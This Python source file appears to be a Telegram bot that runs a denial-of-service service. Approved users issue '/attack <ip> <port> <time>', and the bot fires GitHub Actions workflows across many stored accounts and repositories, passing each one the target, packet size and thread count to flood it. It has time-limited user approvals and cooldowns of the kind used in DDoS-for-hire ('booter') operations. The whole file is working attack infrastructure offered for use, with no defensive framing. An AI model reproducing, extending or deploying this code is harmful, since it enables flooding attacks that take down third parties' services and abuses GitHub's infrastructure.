import time
import asyncio
import aiohttp
import json
import os
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters
from telegram import Update
from datetime import datetime

# --- CONFIGURATION ---
TELEGRAM_TOKEN = "TOKEN_HERE" #
ADMIN_ID = 1234567890         #
CONFIG_FILE = "github_config.json" #
USERS_FILE = "approved_users.json" #
GROUPS_FILE = "approved_groups.json" #

# Power Settings
MAX_ATTACK_TIME = 300 
PACKET_SIZE = 1024
THREADS = 2200
COOLDOWN_TIME = 360 

# State Management
is_attack_running = False
is_cooldown_active = False
cooldown_end_time = 0
current_target = ""

# --- DATA PERSISTENCE ---
def load_json(file, default):
    if os.path.exists(file):
        try:
            with open(file, 'r') as f: return json.load(f)
        except: return default
    return default

GITHUB_ACCOUNTS = load_json(CONFIG_FILE, [])
approved_users = load_json(USERS_FILE, {})
approved_groups = load_json(GROUPS_FILE, {})

def save_data():
    with open(CONFIG_FILE, 'w') as f: json.dump(GITHUB_ACCOUNTS, f)
    with open(USERS_FILE, 'w') as f: json.dump(approved_users, f)
    with open(GROUPS_FILE, 'w') as f: json.dump(approved_groups, f)

# --- CORE LOGIC ---
async def fire_workflow_async(session, token, repo, params):
    """High-speed async trigger for GitHub Actions"""
    url = f"https://api.github.com/repos/{repo}/actions/workflows/main.yml/dispatches"
    headers = {
        "Authorization": f"Bearer {token}",
        "Accept": "application/vnd.github.v3+json",
        "User-Agent": "MustuPower-v2"
    }
    try:
        async with session.post(url, headers=headers, json=params, timeout=10) as resp:
            return resp.status == 204
    except:
        return False

async def trigger_all_workflows(ip, port, duration):
    params = {
        "ref": "main",
        "inputs": {
            "ip": str(ip), "port": str(port), "duration": str(duration),
            "packet_size": str(PACKET_SIZE), "threads": str(THREADS)
        }
    }
    async with aiohttp.ClientSession() as session:
        tasks = []
        for acc in GITHUB_ACCOUNTS:
            for repo in acc['repos']:
                tasks.append(fire_workflow_async(session, acc['token'], repo, params))
        results = await asyncio.gather(*tasks)
        return sum(1 for r in results if r)

# --- COMMANDS ---
async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_attack_running, is_cooldown_active, cooldown_end_time, current_target
    
    user_id = update.effective_user.id
    if str(user_id) not in approved_users and user_id != ADMIN_ID:
        await update.message.reply_text("❌ Not Authorized.")
        return

    if is_attack_running:
        await update.message.reply_text(f"⚠️ Busy: {current_target} is under load.")
        return

    if is_cooldown_active and time.time() < cooldown_end_time:
        rem = int(cooldown_end_time - time.time())
        await update.message.reply_text(f"❄️ Cooldown: {rem}s remaining.")
        return

    try:
        ip, port, duration = context.args[0], context.args[1], int(context.args[2])
        if duration > MAX_ATTACK_TIME:
            await update.message.reply_text(f"❌ Max duration is {MAX_ATTACK_TIME}s")
            return
    except:
        await update.message.reply_text("💡 Usage: /attack <ip> <port> <time>")
        return

    is_attack_running = True
    current_target = f"{ip}:{port}"
    
    await update.message.reply_text(f"🚀 **ATTACK SENT**\n🎯 Target: `{current_target}`\n⏱️ Time: `{duration}s`")
    
    # Run attack in background
    asyncio.create_task(execute_sequence(update, ip, port, duration))

async def execute_sequence(update, ip, port, duration):
    global is_attack_running, is_cooldown_active, cooldown_end_time
    success_nodes = await trigger_all_workflows(ip, port, duration)
    
    await asyncio.sleep(duration)
    
    is_attack_running = False
    is_cooldown_active = True
    cooldown_end_time = time.time() + COOLDOWN_TIME
    
    await update.message.reply_text(f"✅ **TASK FINISHED**\nNodes triggered: {success_nodes}\n❄️ Cooldown started.")

# --- ADMIN COMMANDS ---
async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    try:
        target_id, days = context.args[0], int(context.args[1])
        expiry = time.time() + (days * 86400)
        approved_users[str(target_id)] = {"expiry_time": expiry, "days": days}
        save_data()
        await update.message.reply_text(f"✅ User {target_id} approved for {days} days.")
    except:
        await update.message.reply_text("Usage: /approve <id> <days>")

# ... (Include start, ping, and addrepo handlers from your original code)

def main():
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("approve", approve))
    app.add_handler(CommandHandler("start", lambda u, c: u.message.reply_text("⚡ System Active")))
    # Add other handlers as needed...

    print("✅ High-Power Bot Started")
    app.run_polling()

if __name__ == "__main__":
    main()
    